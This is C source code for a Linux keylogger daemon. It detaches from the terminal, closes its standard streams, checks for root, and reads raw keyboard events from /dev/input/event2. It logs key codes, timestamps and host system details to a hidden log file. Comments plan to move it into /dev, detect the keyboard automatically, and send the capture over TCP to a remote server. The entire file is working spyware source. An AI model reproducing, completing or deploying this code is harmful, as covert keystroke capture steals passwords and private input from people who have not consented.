#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>


int main(void) {
	FILE *fp = NULL;
	FILE *evlog;
	struct utsname unameData;
	uname(&unameData);
	int fd;
	pid_t process_id = 0;
	pid_t sid = 0;
	struct input_event ev;			/* using input_event so we know 
									 * what we're reading from the 
									 * event file */
	process_id = fork();			/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork failure\n");
		exit(1);
	}
	if (process_id > 0) {
		// REMOVE printf WHEN DONE
		printf("process_id of child process %d\n", process_id);
		exit(0);
	}

	umask(0);						/* unmask the file mode */

	sid = setsid();					/* set unique session for 
									 * child process */
	if (sid < 0) {
		exit(1);
	}
	// CHANGE DIRECTORY TO DEV WHEN DONE
	chdir("log/");					/* change daemon working 
									 * directory to /dev */
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	fp = fopen("log.txt", "a+"); 		/* daemon log */
	evlog = fopen("evlog.txt", "a+");  	/* key log */
	fd = open("/dev/input/event2", O_RDONLY|O_NONBLOCK);	/* key event file */
/*
* ADD SLEEP
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
* Send file out via TCP to python server for translation
*/
	if (geteuid() != 0) {								/* check if user is root */
		fprintf(fp, "ERROR: user not root");
		return 1;
	}

	time_t curtime;
	time(&curtime);

	if (evlog == NULL) {
		fprintf(fp, "%s -- ERROR: evlog couldn't be opened\n", ctime(&curtime));
		return 1;
	}

	fprintf(evlog, "\n\n%s", ctime(&curtime));		/* timestamp */
	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	/* system data */
			unameData.nodename, unameData.version,
			unameData.sysname, unameData.release, 
			unameData.machine);

	while(1) {
		fflush(fp);

		read(fd, &ev, sizeof(struct input_event));
		if(ev.type == 1) {
			fprintf(evlog, "%i,%i-", ev.code, ev.value);
			fflush(evlog);
		}
		// else if(ev.type == 0) {
		// 	sleep(1); 	// MUST ADD SLEEP!!!!!
		// }
	}

	fclose(evlog);
	fclose(fp);
	return 0;
}